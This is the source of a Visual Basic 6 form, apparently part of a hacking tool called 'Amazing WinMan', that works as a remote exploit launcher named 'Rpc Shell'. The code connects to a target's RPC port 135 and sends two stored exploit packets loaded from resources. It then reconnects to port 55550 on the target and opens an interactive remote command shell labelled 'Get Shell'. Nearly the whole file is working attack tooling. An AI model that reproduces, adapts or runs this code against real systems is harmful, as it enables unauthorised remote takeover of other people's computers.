VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmShell 
   Appearance      =   0  'Flat
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Rpc Shell"
   ClientHeight    =   6060
   ClientLeft      =   0
   ClientTop       =   -105
   ClientWidth     =   5895
   FillStyle       =   0  'Solid
   ForeColor       =   &H00FFFFFF&
   LinkTopic       =   "frmShell"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6060
   ScaleWidth      =   5895
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text3 
      Appearance      =   0  'Flat
      BackColor       =   &H00181818&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C000&
      Height          =   4575
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   5
      Top             =   540
      Width           =   5655
   End
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      BackColor       =   &H00181818&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   4
      Text            =   "Type commands here."
      Top             =   5250
      Width           =   5655
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00181818&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   3360
      TabIndex        =   3
      Text            =   "135"
      Top             =   120
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00181818&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   480
      TabIndex        =   1
      Text            =   "127.0.0.1"
      Top             =   120
      Width           =   2055
   End
   Begin MSWinsockLib.Winsock Win 
      Left            =   2760
      Top             =   840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Shape Shape6 
      BorderColor     =   &H0000FF00&
      Height          =   315
      Index           =   1
      Left            =   4200
      Top             =   5640
      Width           =   750
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Cancel"
      ForeColor       =   &H0000FF00&
      Height          =   255
      Left            =   4200
      TabIndex        =   8
      Top             =   5685
      Width           =   735
   End
   Begin VB.Label Command2 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Send"
      ForeColor       =   &H0000FF00&
      Height          =   255
      Left            =   5040
      TabIndex        =   7
      Top             =   5685
      Width           =   735
   End
   Begin VB.Shape Shape6 
      BorderColor     =   &H0000FF00&
      Height          =   315
      Index           =   0
      Left            =   5040
      Top             =   5640
      Width           =   750
   End
   Begin VB.Shape Shape5 
      BorderColor     =   &H0000FF00&
      Height          =   315
      Left            =   105
      Top             =   5235
      Width           =   5685
   End
   Begin VB.Label Command1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Get Shell"
      ForeColor       =   &H0000FF00&
      Height          =   255
      Left            =   4440
      TabIndex        =   6
      Top             =   150
      Width           =   1335
   End
   Begin VB.Shape Shape4 
      BorderColor     =   &H0000FF00&
      Height          =   315
      Left            =   4455
      Top             =   105
      Width           =   1335
   End
   Begin VB.Shape Shape3 
      BorderColor     =   &H0000FF00&
      Height          =   4600
      Left            =   110
      Top             =   520
      Width           =   5680
   End
   Begin VB.Shape Shape2 
      BorderColor     =   &H0000FF00&
      Height          =   315
      Index           =   1
      Left            =   3345
      Top             =   105
      Width           =   1005
   End
   Begin VB.Shape Shape2 
      BorderColor     =   &H0000FF00&
      Height          =   310
      Index           =   0
      Left            =   465
      Top             =   110
      Width           =   2080
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H0000FF00&
      Height          =   6060
      Left            =   0
      Top             =   0
      Width           =   5895
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Port:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   2865
      TabIndex        =   2
      Top             =   120
      Width           =   360
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "IP:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   165
      TabIndex        =   0
      Top             =   120
      Width           =   225
   End
End
Attribute VB_Name = "frmShell"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'|\\\\\\\\____________________////////|'
'||\\\\\\\\__________________////////||'
'|||\\\\\\\\________________////////|||'
'||||\\\\\\\\______________////////||||'
'|||||\\\\\\\\____________////////|||||'
'||||||\\\\\\\\__________////////||||||'
'|||||| \\\\\\\\________//////// ||||||'
'||||||  \\\\\\\\______////////  ||||||'
'||||||   \\\\\\\\____////////   ||||||'
'||||||    \\\\\\\\  ////////    ||||||'
'||||||     \\\\\\\\////////     ||||||'
'||||||                          ||||||'
'||||||                          ||||||'
'||||||    !!!!!!!!!!!!!!!!!!    ||||||'
'||||||    ! Amazing WinMan !    ||||||'
'||||||    !!!!!!!!!!!!!!!!!!    ||||||'
'||||||            !!            ||||||'
'||||||            !!            ||||||'
'||||||            !!            ||||||'
'||||||            !!            ||||||'
'||||||........:iLDEREMi:........||||||'
Private SendingCom As Boolean
Private IsShell As Boolean
'Private Com As String

Private Sub Command1_Click()
DoEvents
Win.Close
IsShell = False
SendingCom = False
Text4.Locked = True
Text1.Enabled = False
Text2.Enabled = False
Command1.Enabled = False
Win.RemoteHost = Text1
Win.RemotePort = Text2
Text3.Text = "[+] Connecting..."
Win.Connect
End Sub

Private Sub Command2_Click()

Win.SendData Text4 & Chr(10)
Text3.Text = Text3.Text & Text4 & vbCrLf
Text3.SelStart = Len(Text3.Text)
Text4 = ""
Text4.SetFocus
End Sub

Private Sub Form_Activate()
SetWindowPos Me.hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE Or SWP_NOSIZE
  Set myShadow = New clsShadow
  With myShadow
    If .Shadow(Me) Then
      .Depth = 10
      .Transparency = 128
    Else
      Set myShadow = Nothing
    End If
  End With
If Command$ <> "" Then
a = Split(Command$)
Text1 = a(0)
Text2 = a(1)
Command1_Click
End If
End Sub

Private Sub Form_Resize()
'Text3.Width = Me.Width - 140
'Text3.Height = Me.Height - 920 - Text4.Height
'Text4.Top = Me.ScaleHeight - Text4.Height + 20 '680
'Text4.Width = Me.ScaleWidth - Command2.Width - 20
'Command2.Left = Me.ScaleWidth - Command2.Width
'Command2.Top = Text4.Top
End Sub

Private Sub Label3_Click()
Unload Me
End Sub

Private Sub Text3_Change()
Text3.Refresh
End Sub

Private Sub Text4_KeyDown(KeyCode As Integer, Shift As Integer)
If IsShell = True And KeyCode = 13 Then
Command2_Click
End If
End Sub

Private Sub Win_Connect()
Dim Buf As String
 If SendingCom = False Then
 Text3.Text = Text3.Text & "OK" & vbCrLf
 Text3.Text = Text3.Text & "[+] Sending packet1..."
 Buf = StrConv(LoadResData(102, "First"), vbUnicode)
 Win.SendData Buf
 Else
 Text3.Text = Text3.Text & "Khoshomadi Azizam" & vbCrLf
 Text4.Text = ""
 IsShell = True
 Text4.Locked = False
' text3.text.SelStart = Len(text3.text)
' text3.text.SetFocus
Text4.SetFocus
Command2.Enabled = True
 End If
End Sub

Private Sub Win_DataArrival(ByVal bytesTotal As Long)
Dim Buf As String
If IsShell = False Then
 Text3.Text = Text3.Text & "[+] Sending packet2..."
 SendingCom = True
 Buf = StrConv(LoadResData(103, "Second"), vbUnicode)
 Win.SendData Buf
Else
Win.GetData Buf
If Left(Buf, 2) <> vbCrLf And Right(Text3.Text, 2) <> vbCrLf Then 'agar dorost bashe yani hamoon dastorie ke khodemon ferestadim
Text3.Text = Text3.Text & vbCrLf
End If
Text3.Text = Text3.Text & Buf
Text3.SelStart = Len(Text3.Text)
Text4.SetFocus
End If
End Sub

Private Sub Win_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Text3.Text = Text3.Text & vbCrLf & "[+] " & Description & vbCrLf
Text3.Text = Text3.Text & "[+] Unlucky!"
Text4.Locked = True
Text1.Enabled = True
Text2.Enabled = True
Command1.Enabled = True
End Sub

Private Sub Win_SendComplete()
If IsShell = False Then
 Text3.Text = Text3.Text & "OK" & vbCrLf
 If SendingCom = True Then
 Win.Close
 Win.RemoteHost = Text1
 Win.RemotePort = "55550" 'shell port
 Text3.Text = Text3.Text & "[+] Trying to get shell..."
 Win.Connect
 End If
End If
End Sub
